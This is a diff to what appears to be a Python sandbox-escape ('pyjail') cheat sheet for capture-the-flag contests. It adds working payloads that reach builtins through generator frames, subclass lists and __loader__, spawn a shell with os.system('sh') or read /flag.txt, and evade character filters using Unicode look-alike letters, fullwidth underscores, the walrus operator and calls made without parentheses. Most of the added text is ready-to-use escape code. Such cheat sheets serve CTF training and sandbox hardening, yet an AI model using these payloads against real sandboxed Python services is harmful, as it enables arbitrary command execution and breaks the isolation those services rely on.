@@ -28,6 +28,13 @@ license.__repr__.__builtins__ # or __globals__
 
 # obtain the builtins from a defined function
 func.__globals__['__builtins__']
+(lambda:...).__globals__
+
+# obtain builtins from generators
+(_ for _ in ()).gi_frame.f_builtins
+(_ for _ in ()).gi_frame.f_globals["__builtins__"]
+(await _ for _ in ()).ag_frame.f_builtins
+(await _ for _ in ()).ag_frame.f_globals["__builtins__"]
 ```
 
 ### good to know built-in functions and methods
@@ -73,8 +80,8 @@ print(*open("/flag.txt")
 ().__class__.__mro__[1].__subclasses__()[129].__class__.register.__builtins__["__import__"]("os").system("sh")
 
 # <class 'generator'> - instance
-(_ for _ in ()).gi_frame.f_globals["_""_loader_""_"].load_module("os").system("sh")
-(_ for _ in ()).gi_frame.f_globals["_""_builtins_""_"].eval("_""_import_""_('os').system('sh')")
+(_ for _ in ()).gi_frame.f_globals["__loader__"].load_module("os").system("sh")
+(_ for _ in ()).gi_frame.f_globals["__builtins__"].__import__('os').system('sh')
 
 # <class 'async_generator'> - instance
 (await _ for _ in ()).ag_frame.f_globals["_""_loader_""_"].load_module("os").system("sh")
@@ -95,6 +102,9 @@ numpy.loadtxt("/flag.txt") # stderr
 TBA
 
 # pickle
+TBA
+
+# ast
 TBA
 ```
 
@@ -132,16 +142,20 @@ _＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶
 [𝘺:=()._＿𝘥𝘰𝘤＿_,𝘢:=y[19],()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘺[34]+𝘢).𝘴𝘺𝘴𝘵𝘦𝘮(𝘢+𝘺[56])]
 
 # no ASCII letters, no double underscores, no builtins, no quotes/double quotes, no square brackets inside eval (>= python3.8)
-[𝘥:=()._＿𝘥𝘰𝘤＿_,d:=()._＿dir＿_().__class__(d),𝘴:=𝘥.pop(19),()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_().pop(104).𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘥.pop(33)+𝘴).𝘴𝘺𝘴𝘵𝘦𝘮(𝘴+𝘥.pop(54))]
+(𝘥:=()._＿𝘥𝘰𝘤＿_,d:=()._＿dir＿_().__class__(d),𝘴:=𝘥.𝘱𝘰𝘱(19),𝘥._＿𝘤𝘭𝘢𝘴𝘴＿_(()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_).𝘱𝘰𝘱(1)._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_().𝘱𝘰𝘱(104).𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘥.𝘱𝘰𝘱(33)+𝘴).𝘴𝘺𝘴𝘵𝘦𝘮(𝘴+𝘥.𝘱𝘰𝘱(54)))
+
+# no ASCII letters, no double underscores, no builtins, no quotes/double quotes, no parenthesis inside eval (>= python3.8)
+class cobj:...
+obj = cobj()
+[d:=[].__doc__,o:=d[32],s:=d[17],h:=d[54],[obj[s+h] for obj.__class__.__getitem__ in [[obj[o+s] for obj.__class__.__getitem__ in [[+obj for obj.__class__.__pos__ in [[].__class__.__mro__[1].__subclasses__]][0][104].load_module]][0].system]]]
 ```
 
-### assigning fields and variables
+### assigning attributes and variables
 ```py
 class cobj:...
 ```
 ```py
-# eval
-# walrus operator
+# walrus operator (>= python3.8)
 [a:=().__doc__, print(a)]
 
 # setattr
@@ -152,18 +166,29 @@ cobj.__setattr__("field", "value"), print(cobj.field)
 [cobj for cobj.field in ["value"]], print(cobj.field)
 ```
 
-### deleting variables
-```py
-# eval
-TBA
-
-# exec
-TBA
-```
-
 ### getting attributes without dot
 ```py
+class cobj:...
+obj = cobj()
+```
+```py
 # eval
+# getattr
+getattr(cobj, "field")
+cobj.__getattribute__(cobj, "field")
+obj.__getattribute__("field")
+
+# vars() and |=
+x = vars()
+x |= vars(tuple) # add attributes of tuple into vars (concat)
+l = *(y for y in list(vars()) if chr(98) in y), # ("__builtins__", "__getattribute__") - retrieve keys with underscore in name
+b = __getitem__(l, 0) # __builtins__ - could have shorten into l[0]
+x |= vars(dict); bu = __getitem__(vars(), b) # <module 'builtins' (built-in)> - could have shorten into x[b]
+l = *(y for y in list(vars(bu)) if chr(98) in y and chr(97) in y and chr(112) in y and chr(75) not in y), # ("breakpoint") - retrieve "breakpoint"
+x |= vars(tuple); brs = __getitem__(l, 0) # breakpoint
+x |= vars(dict)
+br = __getitem__(vars(bu), brs) # <built-in function breakpoint>
+br()
 
 # exec
 # match
@@ -171,13 +196,20 @@ match ():
     case object(_＿doc＿_=a):
       pass
 print(a) # ().__doc__
+
+# overwrite builtins
+__builtins__ = sys
+__builtins__ = modules
+__builtins__ = os
+system("cat /flag.txt")
 ```
 
 ### getting attributes without underscore
 ```py
+# exec
 # try...except
 try:
-  "{0.__doc__.lol}".format(()) # format string can also be used to leak values
+  "{0.__doc__.lol}".format(()) # format string by itself can also be used to leak values
 except Exception as e:
   a = e.obj
   print(a) # ().__doc__
@@ -185,7 +217,30 @@ except Exception as e:
 
 ### running functions and methods without parenthesis
 ```py
-# TBA
+class cobj:...
+obj = cobj()
+```
+```py
+# list comprehension
+[+obj for obj.__class__.__pos__ in [().__class__.__subclasses__]][0]
+[obj["print(123)"] for obj.__class__.__getitem__ in [eval]][0]
+```
+
+### deleting variables
+```py
+# exec
+# try...except
+delete_me = ""
+try:
+    p
+except Exception as delete_me:
+    pass
+print(delete_me) # error
+
+# del
+delete_me = ""
+del delete_me
+print(delete_me) # error
 ```
 
 ## General stuff
@@ -205,6 +260,30 @@ except Exception as e:
 ### finding sinks from modules
 - https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code
 - https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code
+
+### bullet points
+- `f"{65:c}"` can format an int to char (equalivant to `"%c" % 65  == chr(65) == "A"`)
+- `"".encode().fromhex("41").decode()` parses hex into string
+- `type`
+    - `[].__class__.__class__`
+    - `"".__class__.__class__`
+- `object`
+    - `[].__class__.__mro__[1]`
+    - `[].__class__.__bases__[0]`
+    - `[].__class__.__base__`
+- `str`
+    - `"".__class__`
+    - `[].__doc__.__class__`
+    - `[].__class__.__module__.__class__`
+- `tuple`
+    - `[].__class__.__bases__.__class__`
+- `dict`
+    - `{}.__class__`
+    - `obj.__dict__.__class__`
+- `class instances`:
+    - `class cobj:...`
+        - `obj = cobj()`
+    - `type("cobj", (object,), {})()`
 
 ## CTF
 
